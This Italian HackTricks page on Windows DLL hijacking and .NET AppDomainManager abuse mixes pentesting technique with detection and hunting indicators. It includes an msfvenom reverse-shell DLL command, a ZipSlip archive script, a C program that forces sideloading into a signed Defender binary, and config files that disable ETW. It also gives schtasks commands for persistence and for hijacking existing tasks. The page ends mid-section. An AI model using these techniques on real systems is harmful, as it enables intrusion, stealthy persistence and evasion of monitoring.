# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

Il DLL Hijacking consiste nel manipolare un'applicazione attendibile affinché carichi una DLL malevola. Questo termine comprende diverse tattiche, come **DLL Spoofing, Injection e Side-Loading**. Viene utilizzato principalmente per l'esecuzione di codice e per ottenere persistenza e, meno comunemente, per l'escalation dei privilegi. Sebbene qui l'attenzione sia rivolta all'escalation, il metodo di hijacking resta lo stesso, indipendentemente dall'obiettivo.

### Tecniche comuni

Per il DLL Hijacking vengono impiegati diversi metodi, ciascuno efficace in base alla strategia di caricamento delle DLL dell'applicazione:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: sostituire una DLL autentica con una malevola, eventualmente usando DLL Proxying per preservare le funzionalità della DLL originale.
2. **DLL Search Order Hijacking**: inserire la DLL malevola in un percorso di ricerca precedente a quello della DLL legittima, sfruttando l'ordine di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: creare una DLL malevola da far caricare a un'applicazione, che la considera una DLL richiesta ma inesistente.
4. **DLL Redirection**: modificare parametri di ricerca come `%PATH%` o file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione alla DLL malevola.
5. **WinSxS DLL Replacement**: sostituire la DLL legittima con una controparte malevola nella directory WinSxS, un metodo spesso associato al DLL Side-Loading.
6. **Relative Path DLL Hijacking**: inserire la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, in modo simile alle tecniche Binary Proxy Execution.

Un'applicazione può anche implementare un **proprio loader di DLL**. Un processo con privilegi elevati può enumerare una directory figlia come `Libraries` o `Plugins` e passare una DLL selezionata a un helper, indipendentemente dal normale ordine di ricerca delle DLL di Windows. Se un altro account può creare file in quella specifica directory, consideralo un indizio da approfondire: verifica l'identità del processo, le ACL effettive della directory, la regola di selezione dei file e la raggiungibilità dell'operazione di caricamento. Una directory scrivibile accanto a un eseguibile non dimostra che il processo carichi DLL da lì.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Grafting degli import PE post-installazione

Il side-loading classico lascia invariato il PE attendibile e sfrutta la risoluzione dei nomi delle DLL. Il **grafting degli import** modifica invece un PE già caricato dal programma attendibile. L'attaccante aggiunge un descrittore di import e le relative voci di lookup/IAT per una DLL controllata dall'attaccante. Quando Windows risolve ricorsivamente tale dipendenza, mappa la DLL aggiunta ed esegue il relativo codice di inizializzazione all'interno del processo altrimenti legittimo. Si tratta di una modifica del PE su disco, non della stessa operazione che consiste nel sostituire un puntatore a una funzione IAT attiva con un hook in fase di esecuzione.<sup>[[31]](#references)[[32]](#references)</sup>

Il PE modificato può essere una DLL intermedia del fornitore, anziché l'eseguibile avviato dall'utente o da Task Scheduler. Una catena riutilizzabile è la seguente:<sup>[[32]](#references)</sup>

1. Copiare l'eseguibile legittimo e le sue dipendenze in una directory controllata dall'attaccante.
2. Modificare le strutture di import di una dipendenza in modo che facciano riferimento alla DLL malevola, mantenendo gli export attesi dalla dipendenza e il normale comportamento.
3. Configurare un'esecuzione automatica o un'attività pianificata per avviare l'eseguibile legittimo. Il loader mappa la dipendenza alterata e poi la DLL appena importata. Consulta [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) per l'enumerazione delle attività.
4. Evitare di eseguire operazioni costose in `DllMain`; il loader osservato creava un thread di lavoro e proseguiva lì la decrittazione in più fasi.

Questo caso differisce da una compromissione della supply chain lato fornitore se il pacchetto del fornitore è pulito e la modifica degli import avviene dopo l'installazione. Per il triage, esamina ogni modulo nella directory di staging, non solo l'EXE host: confronta gli elenchi degli import e gli hash delle dipendenze con un'installazione considerata affidabile, verifica le firme e analizza i binari del fornitore avviati da percorsi scrivibili inaspettati come `C:\ProgramData`. Un'attività pianificata che punta a un crash reporter o updater copiato in una directory di questo tipo è un pivot particolarmente utile.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + assembly dell'attaccante)

Il DLL sideloading classico non è l'unico modo per far caricare codice dell'attaccante a un processo attendibile **.NET Framework**. Se l'eseguibile di destinazione è un'applicazione **managed**, il CLR consulta anche un **file di configurazione dell'applicazione** con il nome dell'eseguibile (ad esempio `Setup.exe.config`). Questo file può definire un **AppDomainManager** personalizzato. Se la configurazione punta a un assembly controllato dall'attaccante e posizionato accanto all'EXE, il CLR lo carica **prima del normale percorso di esecuzione dell'applicazione** e lo esegue all'interno del processo attendibile.<sup>[[24]](#references)</sup>

Secondo lo schema di configurazione .NET Framework di Microsoft, devono essere presenti sia `<appDomainManagerAssembly>` sia `<appDomainManagerType` affinché venga usato il manager personalizzato.<sup>[[16]](#references)[[17]](#references)</sup>

Configurazione minima:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Gestore minimale:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Note pratiche:
- Questa tecnica è specifica di **.NET Framework**. Dipende dall'analisi della configurazione del CLR, non dall'ordine di ricerca delle DLL di Win32.
- L'host deve essere effettivamente un **EXE managed**. Verifica rapida: `sigcheck -m target.exe`, `corflags target.exe` oppure controlla i metadati PE per individuare il **CLR Runtime Header**.
- Il nome del file di configurazione deve corrispondere esattamente a quello dell'eseguibile (`<binary>.config`) e di solito si trova **accanto all'EXE**.
- È utile con **binari firmati di Microsoft o dei fornitori** perché l'EXE attendibile rimane intatto mentre l'assembly managed malevolo viene eseguito in-process.
- Se hai già accesso in scrittura a una directory di installazione/aggiornamento, puoi usare AppDomainManager hijacking come **prima fase**, seguita da un classico DLL sideloading o dal caricamento riflessivo nelle fasi successive.

### Tipo AppDomainManager firmato come gadget di un file di configurazione

Il normale config hijack di AppDomainManager descritto sopra punta a un assembly dell'attaccante. Un percorso diverso in .NET Framework usa un **assembly firmato**, predisposto accanto all'host o comunque risolvibile, il cui tipo manager legge dati ausiliari controllati dall'attaccante. L'attaccante deve comunque controllare il file `.exe.config` adiacente dell'host managed e i file secondari; la firma dell'assembly selezionato non rende sicuri i suoi input di configurazione. Il meccanismo di configurazione è un comportamento consolidato di AppDomainManager, mentre la concatenazione di tipi firmati descritta di seguito è stata osservata nell'analisi di NetamLoader.<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

In questa catena, la configurazione seleziona `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` da `Microsoft.HostIntegration.Connectors`. Durante l'inizializzazione, il tipo cerca `fabric.config` nella directory dell'applicazione. Una voce `customType` specifica `System.Resources.ResXResourceSet` e fornisce `Resources.resx` come argomento del costruttore, raggiungendo un parser di risorse senza distribuire una DLL manager creata dall'attaccante. Perché funzioni, l'assembly firmato correlato ad AppFabric e le classi del framework indicate devono essere risolvibili sul target; non è una caratteristica universale di qualsiasi EXE managed.<sup>[[35]](#references)</sup> Un AppDomainManager configurato richiede inoltre un'applicazione con attendibilità totale; altrimenti il CLR genera `TypeLoadException`.<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

Il contenuto di `Resources.resx` è il sink della deserializzazione, non un semplice file di dati; vedi [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml). Nella fase descritta, il loader XAML ricavava anche la chiave AES dall'hash SHA-256 della **command line completa dell'host convertita in minuscolo** e usava i primi 16 byte del blob decodificato come IV. Riprodurre i file con una command line diversa causa quindi un errore di decrittazione prima che venga caricato il successivo XAML.<sup>[[35]](#references)</sup>

### AppDomainManager come downloader e bootstrap per attività pianificate

Un pattern di intrusione pratico consiste nell'affiancare all'EXE managed attendibile sia un `*.config` malevolo sia una DLL AppDomainManager malevola che funge solo da **piccolo bootstrapper**:<sup>[[25]](#references)</sup>

1. L'utente avvia un installer o updater .NET firmato da una posizione plausibile, ad esempio `%USERPROFILE%\Downloads`.
2. Il file config adiacente induce il CLR a caricare l'assembly dell'attaccante **prima** che inizi la logica legittima dell'app.
3. Il manager malevolo esegue un **path gate** (ad esempio, continua solo se l'EXE host è in esecuzione da `Downloads` e consente l'esecuzione del secondo stage solo da `%LOCALAPPDATA%`).
4. Se il controllo ha esito positivo, scarica il payload effettivo in un percorso scrivibile dall'utente, come `%LOCALAPPDATA%\PerfWatson2.exe`, e installa la persistenza con un'attività pianificata.

Perché questa variante è importante:
- L'EXE host firmato rimane invariato, quindi il triage che controlla solo l'hash del binario principale potrebbe non rilevare la compromissione.
- Il semplice **path-based anti-analysis** è comune: spostare la triade ZIP/EXE/DLL su Desktop, Temp o in un percorso sandbox può interrompere intenzionalmente la catena.
- La DLL AppDomainManager di primo stage può rimanere piccola e poco rumorosa, mentre l'impianto effettivo viene scaricato in seguito.

Esempio minimo di persistenza spesso visto con questo pattern:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Note:
- ` /rl highest` significa **il livello più alto disponibile** per quell'utente/sessione; da solo non garantisce un'escalation a SYSTEM.
- Questa tecnica è spesso classificata più correttamente come **esecuzione/persistenza tramite abuso della configurazione .NET** che come classico missing-DLL search-order hijacking, anche se gli operatori spesso concatenano le due tecniche.

Indicatori per il rilevamento:
- Eseguibili .NET firmati avviati da **percorsi di estrazione ZIP**, `Downloads`, `%TEMP%` o altre cartelle scrivibili dall'utente, con un file `<exe>.config` **nella stessa directory**.
- Nuove attività pianificate la cui azione punta a `%LOCALAPPDATA%`, `%APPDATA%` o `Downloads` e i cui nomi imitano quelli degli updater di browser o vendor.
- Processi bootstrap gestiti di breve durata che scaricano immediatamente un altro EXE e poi avviano `schtasks.exe`.
- Campioni che terminano in anticipo a meno che il percorso dell'eseguibile non corrisponda a una directory prevista del profilo utente.

### Hijacking di un'attività pianificata esistente per riavviare la catena di sideload

Per la persistenza, non cercare solo la **creazione di una nuova attività**. Alcuni gruppi di intrusione aspettano che un installer legittimo crei una **normale attività di aggiornamento**, quindi **riscrivono l'azione dell'attività** affinché il nome, l'autore e il trigger esistenti restino familiari ai difensori.

Workflow riutilizzabile:
1. Installa/esegui il software legittimo e identifica l'attività che crea normalmente.
2. Esporta l'XML dell'attività e annota i valori correnti di `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Sostituisci solo l'azione, in modo che l'attività avvii il tuo **EXE host attendibile** da una directory di staging scrivibile dall'utente; l'EXE eseguirà poi il sideload o caricherà tramite AppDomain il payload reale.
4. Registra nuovamente la stessa attività invece di creare un nuovo artefatto di persistenza evidente.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Perché è più furtivo:
- Il nome dell'attività può sembrare legittimo (per esempio, quello di un programma di aggiornamento di un vendor).
- Viene avviata dal **servizio Task Scheduler**, quindi la convalida del processo padre o degli antenati spesso rileva la normale catena di pianificazione invece di `explorer.exe`.
- I team DFIR che cercano solo **nuovi nomi di attività** potrebbero non rilevare un'attività già registrata la cui azione ora punta a `%LOCALAPPDATA%`, `%APPDATA%` o a un altro percorso controllato dall'attaccante.

Indicatori rapidi per la ricerca:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Confronta i file XML in `C:\Windows\System32\Tasks\*` e i metadati in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` con una baseline.
- Genera un avviso quando un'**attività di aggiornamento dall'aspetto legittimo** viene eseguita da **directory scrivibili dagli utenti** o avvia un EXE .NET con un file `*.config` nella stessa directory.

> [!TIP]
> Per una catena dettagliata che combina staging HTML, configurazioni AES-CTR e impianti .NET con il DLL sideloading, consulta il workflow seguente.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Associare uno stage side-loaded alla riga di comando del servizio

Una DLL side-loaded può richiedere più del nome previsto dell'host EXE e della DLL. Mandiant ha descritto un loader che lega la decrittazione del payload a un argomento della riga di comando e al nome del suo eseguibile host.<sup>[[33]](#references)</sup> In una catena successiva basata su un servizio, un host legittimo copiato caricava una `mscoree.dll` adiacente, che esportava `LockClrVersion` e decrittava il suo stage incorporato solo dopo aver derivato una chiave AES-128 dall'argomento del servizio e dal nome base dell'eseguibile host. Ogni input veniva troncato o completato con NUL fino a 16 byte; la chiave byte per byte era `argument XOR embedded_key XOR executable_basename`, dopodiché il payload veniva decrittato con AES-CBC senza padding. Rinominare l'host o avviarlo senza l'argomento previsto modifica la chiave e impedisce la decrittazione dello stage, anche se la DLL viene comunque caricata. Quando riproduci o analizzi questa variante, mantieni esattamente l'argomento della riga di comando e il nome base.<sup>[[34]](#references)</sup>

Si tratta di un **controllo del payload aggiunto al normale DLL side-loading**, non di una nuova regola sull'ordine di ricerca delle DLL né, di per sé, di una primitiva di privilege escalation. Il livello di privilegio risultante dipende dal contesto di sicurezza del servizio. Il workflow [GitHub issue/file C2](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) documenta separatamente il trasporto successivo.<sup>[[34]](#references)</sup>

## Individuare le DLL mancanti

Il modo più comune per trovare DLL mancanti in un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) di Sysinternals e **impostare i seguenti 2 filtri**:

![Tecniche comuni - Individuare le DLL mancanti: il modo più comune per trovare DLL mancanti in un sistema è eseguire procmon di Sysinternals e impostare i seguenti 2 filtri](<../../../images/image (961).png>)

![Tecniche comuni - Individuare le DLL mancanti: il modo più comune per trovare DLL mancanti in un sistema è eseguire procmon di Sysinternals e impostare i seguenti 2 filtri](<../../../images/image (230).png>)

e visualizzare solo **File System Activity**:

![Tecniche comuni - Individuare le DLL mancanti: e visualizzare solo l'attività del file system](<../../../images/image (153).png>)

Se cerchi **DLL mancanti in generale**, lascia il programma in esecuzione per alcuni **secondi**.\
Se cerchi una **DLL mancante in un eseguibile specifico**, imposta un altro filtro, ad esempio **"Process Name" "contains" `<exec name>`**, esegui il programma e interrompi l'acquisizione degli eventi.<sup>[[9]](#references)</sup>

## Sfruttare le DLL mancanti

Per ottenere una privilege escalation, cerca una **DLL che un processo con privilegi tenta di caricare** da una posizione in cui puoi scrivere. Questo può accadere quando controlli una directory cercata prima di quella che contiene la DLL legittima, oppure quando la DLL richiesta non esiste e puoi scrivere in una delle directory cercate.

### Ordine di ricerca delle DLL

**Nella** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare informazioni dettagliate su come vengono caricate le DLL.**

Le **applicazioni Windows** cercano le DLL seguendo un insieme di **percorsi di ricerca predefiniti**, rispettando una sequenza specifica. Il DLL hijacking si verifica quando una DLL dannosa viene posizionata strategicamente in una di queste directory, in modo da essere caricata prima della DLL autentica. Per evitarlo, assicurati che l'applicazione usi percorsi assoluti per fare riferimento alle DLL necessarie.

Di seguito è riportato l'**ordine di ricerca delle DLL** nei sistemi **a 32 bit**:

1. La directory da cui è stata caricata l'applicazione.
2. La directory di sistema. Usa la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il percorso di questa directory.(_C:\Windows\System32_)
3. La directory di sistema a 16 bit. Non esiste una funzione per ottenere il percorso di questa directory, ma viene comunque cercata. (_C:\Windows\System_)
4. La directory di Windows. Usa la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il percorso di questa directory.
   1. (_C:\Windows_)
5. La directory corrente.
6. Le directory elencate nella variabile d'ambiente PATH. Nota che non sono inclusi i percorsi specifici dell'applicazione indicati nella chiave di registro **App Paths**. La chiave **App Paths** non viene usata per calcolare il percorso di ricerca delle DLL.

Questo è l'ordine di ricerca **predefinito** con **SafeDllSearchMode** abilitato. Se è disabilitato, la directory corrente sale al secondo posto. Per disabilitare questa funzionalità, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo su 0 (il valore predefinito è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, una DLL può essere caricata usando il percorso assoluto invece del nome. In tal caso, Windows cerca la DLL stessa solo in quel percorso; le dipendenze richieste per nome continuano invece a seguire l'ordine di ricerca applicabile.

Esistono altri modi per modificare l'ordine di ricerca, ma non li spiegherò qui.

### Concatenare una scrittura arbitraria di file a un hijack di DLL mancante

**Tecnica correlata:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Usa i filtri di **ProcMon** (`Process Name` = EXE di destinazione, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) per raccogliere i nomi delle DLL che il processo cerca senza trovare.<sup>[[14]](#references)</sup>
2. Se il binario viene eseguito **in base a una pianificazione o come servizio**, inserendo nella **directory dell'applicazione** (voce n. 1 nell'ordine di ricerca) una DLL con uno di quei nomi, questa verrà caricata alla successiva esecuzione. In un caso con uno scanner .NET, il processo cercava `hostfxr.dll` in `C:\samples\app\` prima di caricare la copia reale da `C:\Program Files\dotnet\fxr\...`.
3. Crea una DLL di payload (ad esempio, una reverse shell) con una qualsiasi funzione esportata: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se la tua primitiva è una **scrittura arbitraria di tipo ZipSlip**, crea un archivio ZIP con una voce che esca dalla directory di estrazione, in modo che la DLL finisca nella directory dell'applicazione:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Consegna l’archivio alla inbox/condivisione monitorata; quando l’attività pianificata riavvia il processo, questo carica la DLL malevola ed esegue il tuo codice come account del servizio.

### Forzare il sideloading tramite RTL_USER_PROCESS_PARAMETERS.DllPath

Un metodo avanzato per influenzare in modo deterministico il percorso di ricerca delle DLL di un processo appena creato consiste nell’impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS durante la creazione del processo con le API native di ntdll. Specificando una directory controllata dall’attaccante, è possibile forzare un processo di destinazione che risolve una DLL importata tramite nome (senza percorso assoluto e senza usare i flag di caricamento sicuro) a caricare una DLL malevola da quella directory.

Idea chiave
- Crea i parametri del processo con RtlCreateProcessParametersEx e specifica un DllPath personalizzato che punti alla tua cartella controllata (ad esempio, la directory in cui si trova il tuo dropper/unpacker).
- Crea il processo con RtlCreateUserProcess. Quando il binario di destinazione risolve una DLL tramite nome, il loader consulterà il DllPath specificato durante la risoluzione, consentendo un sideloading affidabile anche quando la DLL malevola non si trova nella stessa directory dell’EXE di destinazione.

Note/limitazioni
- Questo effetto riguarda il processo figlio in fase di creazione; è diverso da SetDllDirectory, che agisce solo sul processo corrente.
- Il processo di destinazione deve importare o caricare con LoadLibrary una DLL tramite nome (senza percorso assoluto e senza usare LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e i percorsi assoluti codificati non possono essere hijacked. Gli export inoltrati e SxS possono modificare la precedenza.

Esempio C minimale (ntdll, stringhe wide, gestione degli errori semplificata):

<details>
<summary>Esempio C completo: forzare il sideloading di DLL tramite RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Esempio di utilizzo operativo
- Inserisci una xmllite.dll malevola (che esporta le funzioni richieste o fa da proxy a quella reale) nella directory DllPath.
- Avvia un binario firmato che, usando la tecnica descritta sopra, è noto per cercare xmllite.dll per nome. Il loader risolve l'import tramite il DllPath fornito e carica la tua DLL tramite sideloading.

Questa tecnica è stata osservata nel mondo reale per avviare catene di sideloading multi-stage: un launcher iniziale rilascia una DLL helper, che poi avvia un binario firmato da Microsoft e vulnerabile all'hijacking, con un DllPath personalizzato per forzare il caricamento della DLL dell'attaccante da una directory di staging.<sup>[[6]](#references)</sup>


### Hijacking di AppDomainManager .NET tramite `.exe.config`

Per i target **.NET Framework**, il sideloading può avvenire **prima di `Main()`** senza modificare la memoria, sfruttando il file **`.exe.config`** adiacente all'applicazione. Invece di basarsi solo sull'ordine di ricerca delle DLL Win32, l'attaccante colloca un EXE .NET legittimo accanto a un file di configurazione malevolo e a uno o più assembly controllati dall'attaccante.

Come funziona la catena:<sup>[[15]](#references)[[22]](#references)</sup>
1. L'EXE host si avvia e il **CLR legge `<exe>.config`**.
2. Il file di configurazione imposta **`<appDomainManagerAssembly>`** e **`<appDomainManagerType>`**, così il runtime istanzia un `AppDomainManager` controllato dall'attaccante.
3. Il manager malevolo ottiene **l'esecuzione prima di `Main()`** all'interno del processo host attendibile.
4. Lo stesso file di configurazione può forzare il CLR a risolvere prima gli assembly locali (ad esempio `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) e può indebolire la convalida e la telemetria del runtime senza patch inline.

Schema tipico di una campagna (la struttura esatta può variare in base alla direttiva e alla versione del CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Perché è utile:
- **`<probing privatePath="."/>`** mantiene la risoluzione degli assembly nella directory dell'applicazione, trasformando la cartella in una superficie di sideloading prevedibile.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** spostano l'esecuzione nel codice dell'attaccante durante l'inizializzazione del CLR, prima che venga eseguita la logica legittima dell'app.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** può consentire a un'app con attendibilità completa di caricare assembly non firmati o manomessi senza che si verifichi un errore di convalida dello strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** evita i reindirizzamenti delle publisher policy verso assembly più recenti.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** rende più deterministica la selezione del runtime.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** è particolarmente interessante perché il **CLR disabilita la propria visibilità ETW** tramite la configurazione, invece che tramite una patch in memoria di `EtwEventWrite` da parte dell'implant.

Schema operativo osservato in campagne recenti:
- Fase 1: deposita `setup.exe`, `setup.exe.config` e assembly locali.
- Fase 2: li copia in una cartella **AppData di aggiornamento** credibile, rinomina l'host con un nome come `update.exe` e lo riavvia tramite un'**attività pianificata**.
- Fase 3: verifica il contesto di esecuzione (ad esempio, che il processo padre previsto sia `svchost.exe` avviato da Task Scheduler) prima di caricare la DLL/export finale del RAT.

Idee per la ricerca:
- **Eseguibili .NET** firmati o altrimenti legittimi eseguiti con file **`.config`** adiacenti sospetti in percorsi scrivibili dagli utenti.
- File `.config` contenenti **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** o **`etwEnable enabled="false"`**.
- Attività pianificate che riavviano eseguibili di aggiornamento rinominati da **`%LOCALAPPDATA%`** o da directory specifiche dell'app come `\bin\update\`.
- Catene di processi padre/figlio in cui un'attività pianificata avvia un host .NET attendibile che carica immediatamente assembly non del fornitore dalla propria directory.

#### Eccezioni all'ordine di ricerca delle DLL nella documentazione di Windows

Nella documentazione di Windows sono indicate alcune eccezioni all'ordine standard di ricerca delle DLL:

- Quando viene individuata una **DLL con lo stesso nome di una già caricata in memoria**, il sistema ignora la normale ricerca. Verifica invece la presenza di un reindirizzamento e di un manifest, quindi, in assenza di questi, usa la DLL già presente in memoria. **In questo scenario, il sistema non cerca la DLL**.
- Se la DLL viene riconosciuta come **Known DLL** per la versione corrente di Windows, il sistema utilizza la propria versione di tale DLL e tutte le DLL da cui dipende, **senza eseguire la ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene un elenco di queste DLL.
- Se una **DLL ha dipendenze**, la ricerca di queste DLL dipendenti avviene come se fossero indicate solo tramite i rispettivi **nomi di modulo**, indipendentemente dal fatto che la DLL iniziale sia stata individuata tramite un percorso completo.

### Escalation dei privilegi

**Requisiti**:

- Individuare un processo che opera o opererà con **privilegi diversi** (movimento orizzontale o laterale) e a cui **manca una DLL**.
- Assicurarsi di disporre dell'**accesso in scrittura** a una qualsiasi **directory** in cui verrà **cercata la DLL**. Può trattarsi della directory dell'eseguibile o di una directory inclusa nel percorso di sistema.

Questi prerequisiti sono rari per impostazione predefinita: di solito gli eseguibili con privilegi elevati non hanno dipendenze DLL mancanti e gli utenti standard normalmente non possono scrivere nelle directory del percorso di ricerca del sistema. Tuttavia, gli ambienti configurati in modo errato possono presentare entrambe le condizioni.\
Se i requisiti sono soddisfatti, consulta il progetto [UACME](https://github.com/hfiref0x/UACME). Sebbene il suo obiettivo principale sia l'UAC bypass, include PoC di DLL hijacking per specifiche versioni di Windows, spesso adattabili alla directory scrivibile individuata.

Nota che puoi **verificare i tuoi permessi in una cartella** con:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

E **controlla i permessi di tutte le cartelle presenti in PATH**:

```bash
